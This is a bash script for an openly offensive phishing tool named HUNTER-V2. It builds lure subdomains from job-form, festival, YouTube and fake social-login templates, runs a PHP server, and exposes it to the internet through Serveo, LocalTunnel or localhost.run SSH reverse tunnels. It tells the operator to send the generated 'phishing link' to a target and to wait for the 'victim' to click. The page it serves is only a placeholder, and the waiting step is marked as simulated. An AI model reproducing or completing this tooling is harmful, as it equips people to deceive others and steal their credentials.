#!/bin/bash

__NAME__="HUNTER-V2"
__VERSION__="2.0"
__AUTHOR__="ATHEX"

### Script termination with proper signal handling
trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!\033[0m"; loading; redirection; exit 1' SIGINT
trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!\033[0m"; loading; redirection; exit 1' SIGTERM
trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!\033[0m"; suspend_script; exit 1' SIGTSTP

# Initialize variables
temp=""
mal_link=""
festName=""
subdomain=""
videoID=""
platformName=""
platformURL=""
server=""
PHP_PID=""
SSH_PID=""
LT_PID=""

# Detect OS
detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
    else
        OS=$(uname -s | tr '[:upper:]' '[:lower:]')
    fi
    
    # Kali Linux specific
    if [[ $OS == *"kali"* ]] || [[ $(uname -a) == *"kali"* ]]; then
        OS="kali"
        PKG_MANAGER="apt"
    elif command -v apt-get >/dev/null 2>&1; then
        PKG_MANAGER="apt"
    elif command -v pacman >/dev/null 2>&1; then
        PKG_MANAGER="pacman"
    elif command -v yum >/dev/null 2>&1; then
        PKG_MANAGER="yum"
    elif command -v brew >/dev/null 2>&1; then
        PKG_MANAGER="brew"
    else
        PKG_MANAGER="unknown"
    fi
}

detect_os

function Desktop()
{
    clear
    printf "\033[1;33m                             CREATED  BY ~ \033[1;37mA T H E X\033[1;33m ~\n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "    ######## # ###### ###### # # ###### ######## ######## ######## ########     \n"
    printf "    ######## #  ##  # #  ##  # #  ##  # #      # #      # #      # ########     \n"
    printf "    ######## #  ##  # #  ##  # #   #  # ###  ### #  ##### #  ##  # ########     \n"
    printf "    ######## #      # #  ##  # #      # ###  ### #    ### #  ##  # ########     \n"
    printf "    ######## #  ##  # #  ##  # #  ##  # ###  ### #  ##### #     ## ########     \n"
    printf "    ######## #  ##  # ##    ## #  ##  # ###  ### #      # #  ##  # ########     \n"
    printf "    ######## #####  # ######## ###### # #### ### ######## ######## ########     \n"
    printf "    ######## ###### # ####### ##### \033[1;37m\033[4;1mv[$__VERSION__]\033[0m\033[1;33m ####  \n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "    ######## ######## \033[1;37m\033[4;1mhttps://athex-software-house.netlify.app\033[0m\033[1;33m########\n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
    printf "\033[0m\n"
}                           

function Android()
{
    clear
    printf "\033[1;33m  CREATED BY \033[1;37mATHEX\033[1;33m\n"
    printf "         /\  ____  __/|  ________\033[1;37mv\033[4;1m[$__VERSION__]\033[0m\033[1;33m__ \n"
    printf "        / / / / / / / | / /_  __/ ____/ __ \ \n"
    printf "       / /_/ / / / /  |/ / / / / __/ / /_/ / \n"
    printf "      / __  / /_/ / /|  / / / / /___/ _, _/  \n"
    printf "     /_/ / /\____/_/ | / / / /_____/_/ |_|   \n"
    printf "         \/          |/  \/                  \n"
    printf "\033[1;37m\033[4;1mhttps://instagram/itx_athex86/\033[0m  \n"
    printf "\033[0m\n"
}

function banner(){
    arch=$(uname -a | grep -o 'arm' | head -n1)
    arch2=$(uname -a | grep -o 'Android' | head -n1)
    arch3=$(uname -a | grep -o 'aarch64' | head -n1)
    arch4=$(uname -a | grep -o 'Darwin' | head -n1)

    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] && [[ $arch4 != *'Darwin'* ]]; then
        Android
    else
        Desktop
    fi
}

function loading()
{
    printf "."
    sleep 0.5
    printf "."
    sleep 0.5
    printf "."
    sleep 0.5
    printf "\033[0m\n"
}

function kill_Processors() 
{
    printf "\n\033[1;33m[++] Killing background processes...\033[0m"
    
    # Kill PHP servers
    pkill -f "php -S" 2>/dev/null
    pkill -f "php -S localhost" 2>/dev/null
    
    # Kill SSH tunnels
    pkill -f "ssh -o StrictHostKeyChecking" 2>/dev/null
    pkill -f "ssh -R" 2>/dev/null
    
    # Kill LocalTunnel
    pkill -f "lt --port" 2>/dev/null
    pkill -f "node.*lt" 2>/dev/null
    
    # Kill by PID if set
    [ -n "$PHP_PID" ] && kill -9 "$PHP_PID" 2>/dev/null
    [ -n "$SSH_PID" ] && kill -9 "$SSH_PID" 2>/dev/null
    [ -n "$LT_PID" ] && kill -9 "$LT_PID" 2>/dev/null
    
    # Kill processes on port 31301
    if command -v fuser >/dev/null 2>&1; then
        fuser -k 31301/tcp 2>/dev/null
    elif command -v lsof >/dev/null 2>&1; then
        lsof -ti:31301 | xargs kill -9 2>/dev/null
    fi
    
    # Clean up temp files
    rm -f sshError maliciouslink ip.txt victims.txt form.txt attention.txt image.txt 2>/dev/null
    sleep 1
}

function install_LT()
{
    read -p $'\n\033[1;33m[\033[1;37m++\033[1;33m] Press [\033[1;37mEnter\033[1;33m] to install LocalTunnel, otherwise type (n/No): \033[1;37m' act
    if [[ $act == "n" || $act == "no" || $act == "N" || $act == "No" || $act == "NO" ]]; then
        printf "\n\033[1;33m[\033[1;37m++\033[1;33m] LocalTunnel installation skipped.\n"
        return 1
    fi

    printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Installing Node.js and npm..."
    loading
    
    if ! command -v npm >/dev/null 2>&1; then
        case $PKG_MANAGER in
            apt)
                sudo apt update && sudo apt install -y nodejs npm 2>/dev/null || {
                    printf "\033[1;31m[!!] Failed to install Node.js\n"
                    printf "\033[1;33m[++] Try: sudo apt update && sudo apt install nodejs npm -y\n"
                    return 1
                }
                ;;
            *)
                printf "\033[1;31m[!!] Unsupported package manager. Install Node.js manually.\n"
                return 1
                ;;
        esac
    fi
    
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Installing LocalTunnel..."
    loading
    
    sudo npm install -g localtunnel 2>/dev/null || {
        npm install -g localtunnel 2>/dev/null || {
            printf "\033[1;31m[!!] Failed to install LocalTunnel\n"
            printf "\033[1;33m[++] Try: sudo npm install -g localtunnel\n"
            return 1
        }
    }
    
    printf "\033[1;32m[√√] LocalTunnel installed successfully!\n"
    return 0
}

function suspend_script()
{
    printf "\n\033[1;33m[\033[1;37m++\033[1;33m] Script suspended. Type 'fg' to continue or 'bg' to run in background.\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] GitHub: https://github.com/Athexhacker/HUNTER-V2\n"
    loading
    exit 0
}

function redirection() 
{
    kill_Processors
    printf "\n\033[1;33m[\033[1;37m++\033[1;33m] GitHub: https://github.com/Athexhacker/HUNTER-V2\n"
    printf "\033[1;33m[\033[1;37m++\033[1;33m] Email: athexithouse@gmail.com\n"
    loading
    exit 0
}

function check_dependencies() {
    local missing_deps=()
    
    # Check for PHP
    if ! command -v php >/dev/null 2>&1; then
        missing_deps+=("php")
    fi
    
    # Check for curl/wget for internet checks
    if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
        missing_deps+=("curl or wget")
    fi
    
    # Check for unzip if needed
    if ! command -v unzip >/dev/null 2>&1; then
        missing_deps+=("unzip")
    fi
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        printf "\n\033[1;31m[!!] Missing dependencies: ${missing_deps[*]}\n"
        printf "\033[1;33m[++] Installing dependencies...\n"
        
        case $PKG_MANAGER in
            apt)
                sudo apt update
                for dep in "${missing_deps[@]}"; do
                    if [[ $dep == *"php"* ]]; then
                        sudo apt install -y php php-curl 2>/dev/null
                    elif [[ $dep == *"curl"* ]]; then
                        sudo apt install -y curl wget 2>/dev/null
                    elif [[ $dep == *"unzip"* ]]; then
                        sudo apt install -y unzip 2>/dev/null
                    fi
                done
                ;;
            *)
                printf "\033[1;31m[!!] Please install missing dependencies manually:\n"
                printf "     ${missing_deps[*]}\n"
                return 1
                ;;
        esac
    fi
    
    return 0
}

function template()
{
    printf "\n\033[1;37m-------\033[1;33mTemplate Served\033[1;37m-------\n\n"    
    printf "   \033[1;33m[\033[1;37m01\033[1;33m] Applicant Form\n"
    printf "   \033[1;33m[\033[1;37m02\033[1;33m] Festival Wishing\n"
    printf "   \033[1;33m[\033[1;37m03\033[1;33m] Live YouTube Video\n"
    printf "   \033[1;33m[\033[1;37m04\033[1;33m] Custom Social Platform\n\n"
    
    while true; do
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose Template [1-4]:\033[1;37m ' temp
        
        if [[ -z "$temp" ]]; then
            temp=1
            break
        elif [[ "$temp" =~ ^[1-4]$ ]]; then
            break
        else
            printf "\033[1;31m[!!] Invalid choice. Enter 1-4.\033[0m\n"
        fi
    done

    case $temp in
        1)
            subdomain="jobapplicationform-$RANDOM"
            printf "\033[1;32m[√√] Selected: Applicant Form Template\n"
            ;;
        2)
            while true; do
                read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Festival Name:\033[1;37m ' festName
                if [[ -n "$festName" ]]; then
                    festName=$(echo "$festName" | tr ' ' '-')
                    subdomain="happy-$festName-season-$RANDOM"
                    printf "\033[1;32m[√√] Selected: Festival Template - $festName\n"
                    break
                else
                    printf "\033[1;31m[!!] Festival name cannot be empty.\033[0m\n"
                fi
            done
            ;;
        3)
            while true; do
                read -p $'\033[1;33m[\033[1;37m++\033[1;33m] YouTube Video ID:\033[1;37m ' videoID
                if [[ -n "$videoID" ]]; then
                    subdomain="youtube-$videoID-$RANDOM"
                    printf "\033[1;32m[√√] Selected: YouTube Template\n"
                    break
                else
                    printf "\033[1;31m[!!] Video ID cannot be empty.\033[0m\n"
                fi
            done
            ;;
        4)
            while true; do
                read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Platform Name:\033[1;37m ' platformName
                read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Login URL:\033[1;37m ' platformURL
                if [[ -n "$platformName" && -n "$platformURL" ]]; then
                    platformName=$(echo "$platformName" | tr ' ' '-')
                    subdomain="$platformName-login-$RANDOM"
                    printf "\033[1;32m[√√] Selected: $platformName Platform Template\n"
                    break
                else
                    printf "\033[1;31m[!!] Both fields are required.\033[0m\n"
                fi
            done
            ;;
    esac
    
    sleep 1
}

function templateSetup()
{
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Setting up template..."
    loading
    
    # Create template directory if it doesn't exist
    mkdir -p templates
    
    # Create a simple index.html for testing
    cat > templates/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <h1>Page Loading...</h1>
    <p>Please wait while we set up the page.</p>
</body>
</html>
EOF
    
    printf "\n\033[1;32m[√√] Template ready!\n"
    printf "\033[1;33m[++] Generated Link: \033[1;37m%s\n" "$mal_link"
    printf "\033[1;33m[++] Send this link to your target.\n"
    printf "\033[1;33m[++] Waiting for victim to click the link...\n"
    
    # Simulate waiting for victim
    while true; do
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Press Enter to stop waiting or Ctrl+C to exit:\033[1;37m ' input
        if [[ -n "$input" ]]; then
            break
        fi
        sleep 2
        printf "\033[1;33m[++] Still waiting...\n"
    done
    
    redirection
}

function localhost() 
{   
    check_dependencies || exit 1
    
    printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Starting PHP server on port 8080..."
    loading
    
    # Kill any existing server on port 8080
    kill_Processors
    
    # Start PHP server
    php -S 127.0.0.1:8080 -t templates/ > /dev/null 2>&1 &
    PHP_PID=$!
    
    sleep 2
    
    # Check if server is running
    if ps -p $PHP_PID > /dev/null; then
        mal_link="http://127.0.0.1:8080"
        printf "\033[1;32m[√√] PHP server started successfully!\n"
        printf "\033[1;33m[++] Server running on: \033[1;37m%s\n" "$mal_link"
        templateSetup
    else
        printf "\033[1;31m[!!] Failed to start PHP server.\n"
        printf "\033[1;33m[++] Check if port 8080 is available.\n"
        exit 1
    fi
}

function serveo() 
{   
    check_dependencies || exit 1
    
    if ! command -v ssh >/dev/null 2>&1; then
        printf "\033[1;33m[++] Installing SSH client...\n"
        case $PKG_MANAGER in
            apt) sudo apt install -y openssh-client ;;
            *) printf "\033[1;31m[!!] Please install SSH client manually.\n"; exit 1 ;;
        esac
    fi
    
    printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Starting PHP server..."
    loading
    
    kill_Processors
    
    php -S 127.0.0.1:8080 -t templates/ > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting Serveo tunnel..."
    loading
    
    # Start SSH tunnel
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:8080 serveo.net 2>/dev/null &
    SSH_PID=$!
    sleep 5
    
    printf "\033[1;32m[√√] Tunnel established!\n"
    printf "\033[1;33m[++] Your link will be: https://*.serveo.net\n"
    printf "\033[1;33m[++] Note: Serveo may provide different subdomain each time.\n"
    
    mal_link="https://$(hostname).serveo.net"
    templateSetup
}

function localtunnel() 
{   
    check_dependencies || exit 1
    
    if ! command -v lt >/dev/null 2>&1; then
        printf "\033[1;33m[++] LocalTunnel not found.\n"
        install_LT || {
            printf "\033[1;31m[!!] Cannot proceed without LocalTunnel.\n"
            exit 1
        }
    fi
    
    printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Starting PHP server..."
    loading
    
    kill_Processors
    
    php -S 127.0.0.1:8080 -t templates/ > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting LocalTunnel..."
    loading
    
    # Start LocalTunnel
    lt --port 8080 --subdomain "$subdomain" 2>/dev/null &
    LT_PID=$!
    sleep 5
    
    mal_link="https://${subdomain}.loca.lt"
    printf "\033[1;32m[√√] LocalTunnel started!\n"
    printf "\033[1;33m[++] Your link: \033[1;37m%s\n" "$mal_link"
    
    templateSetup
}

function localXposer() 
{   
    check_dependencies || exit 1
    
    if ! command -v ssh >/dev/null 2>&1; then
        printf "\033[1;33m[++] Installing SSH client...\n"
        case $PKG_MANAGER in
            apt) sudo apt install -y openssh-client ;;
            *) printf "\033[1;31m[!!] Please install SSH client manually.\n"; exit 1 ;;
        esac
    fi
    
    printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Starting PHP server..."
    loading
    
    kill_Processors
    
    php -S 127.0.0.1:8080 -t templates/ > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    
    printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting localhost.run tunnel..."
    loading
    
    # Start localhost.run tunnel
    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 ssh.localhost.run 2>/dev/null &
    SSH_PID=$!
    sleep 5
    
    printf "\033[1;32m[√√] Tunnel established!\n"
    printf "\033[1;33m[++] Your link will be: https://*.localhost.run\n"
    
    mal_link="https://$(hostname).localhost.run"
    templateSetup
}

function tunnel()
{
    printf "\n\033[1;37m-------\033[1;33mTunnel Servers\033[1;37m-------\n\n"    
    printf "   \033[1;33m[\033[1;37m01\033[1;33m] Localhost (127.0.0.1:8080)\n"
    printf "   \033[1;33m[\033[1;37m02\033[1;33m] Serveo.Net (Online)\n"
    printf "   \033[1;33m[\033[1;37m03\033[1;33m] LocalTunnel (Online)\n"
    printf "   \033[1;33m[\033[1;37m04\033[1;33m] localhost.run (Online)\n\n"
    
    while true; do
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose Server [1-4]:\033[1;37m ' server
        
        if [[ -z "$server" ]]; then
            server=1
            break
        elif [[ "$server" =~ ^[1-4]$ ]]; then
            break
        else
            printf "\033[1;31m[!!] Invalid choice. Enter 1-4.\033[0m\n"
        fi
    done

    # Get template first
    template
    
    case $server in
        1)
            printf "\033[1;33m[++] Selected: Localhost Server\n"
            localhost
            ;;
        2)
            printf "\033[1;33m[++] Selected: Serveo.Net Server\n"
            serveo
            ;;
        3)
            printf "\033[1;33m[++] Selected: LocalTunnel Server\n"
            localtunnel
            ;;
        4)
            printf "\033[1;33m[++] Selected: localhost.run Server\n"
            localXposer
            ;;
    esac
}

function aboutUS()
{
    clear
    banner
    printf "\n\033[1;37m-------\033[1;33mAbout Tool\033[1;37m-------\n\n"    
    printf "   \033[1;33mVersion        \033[1;37m%s\n" "$__VERSION__"
    printf "   \033[1;33mTool Name      \033[1;37mHUNTER-V2\n"
    printf "   \033[1;33mAuthor         \033[1;37mATHEX\n"
    printf "   \033[1;33mEmail          \033[1;37mathexithouse@gmail.com\n"
    printf "   \033[1;33mGitHub         \033[1;37mhttps://github.com/Athexhacker\n"
    printf "\n\033[1;33m[++] Press Enter to continue...\033[0m"
    read -p ""
    menu
}

function guide()
{
    clear
    banner
    printf "\n\033[1;37m-------\033[1;33mHow to Use HUNTER-V2\033[1;37m-------\n\n"
    printf "\033[1;33m[Step 1] Choose a template (forms, festival, etc.)\n"
    printf "\033[1;33m[Step 2] Select a tunneling method\n"
    printf "\033[1;33m[Step 3] Get your phishing link\n"
    printf "\033[1;33m[Step 4] Send link to target\n"
    printf "\033[1;33m[Step 5] Wait for target to click\n"
    printf "\n\033[1;33m[++] Press Enter to continue...\033[0m"
    read -p ""
    menu
}

function updateUS()
{
    printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Checking for updates..."
    loading
    printf "\033[1;33m[++] Current version: $__VERSION__\n"
    printf "\033[1;33m[++] Updates are managed via GitHub.\n"
    printf "\033[1;33m[++] Visit: https://github.com/Athexhacker/HUNTER-V2\n"
    sleep 2
    menu
}

function menu()
{
    printf "\n\033[1;37m-------\033[1;33mMain Menu\033[1;37m-------\n\n"    
    printf "   \033[1;33m[\033[1;37m01\033[1;33m] Exit\n"
    printf "   \033[1;33m[\033[1;37m02\033[1;33m] About Us\n"
    printf "   \033[1;33m[\033[1;37m03\033[1;33m] How it Works\n"
    printf "   \033[1;33m[\033[1;37m04\033[1;33m] Update Script\n"
    printf "   \033[1;33m[\033[1;37m05\033[1;33m] Launch an Attack\n\n"
    
    while true; do
        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose option [1-5]:\033[1;37m ' act
        
        case $act in
            1|01)
                printf "\n\033[1;33m[++] Exiting...\n"
                redirection
                ;;
            2|02)
                aboutUS
                ;;
            3|03)
                guide
                ;;
            4|04)
                updateUS
                ;;
            5|05)
                tunnel
                ;;
            "")
                printf "\n\033[1;31m[!!] Please select an option.\033[0m\n"
                ;;
            *)
                printf "\n\033[1;31m[!!] Invalid option. Try again.\033[0m\n"
                ;;
        esac
    done
}

function hunter()
{
    clear
    printf "\033[1;33m[++] Starting HUNTER-V2...\n"
    
    # Check if running as root
    if [[ $EUID -eq 0 ]]; then
        printf "\033[1;31m[!!] Warning: Running as root is not recommended!\n"
        printf "\033[1;33m[++] Consider running as normal user.\n"
        sleep 2
    fi
    
    # Check internet connection
    printf "\033[1;33m[++] Checking internet connection..."
    if ping -c 1 google.com >/dev/null 2>&1 || ping -c 1 8.8.8.8 >/dev/null 2>&1; then
        printf "\033[1;32m OK\n"
    else
        printf "\033[1;31m FAILED\n"
        printf "\033[1;33m[++] Some features require internet connection.\n"
    fi
    
    sleep 1
    banner
    menu
}

# Start the script
hunter
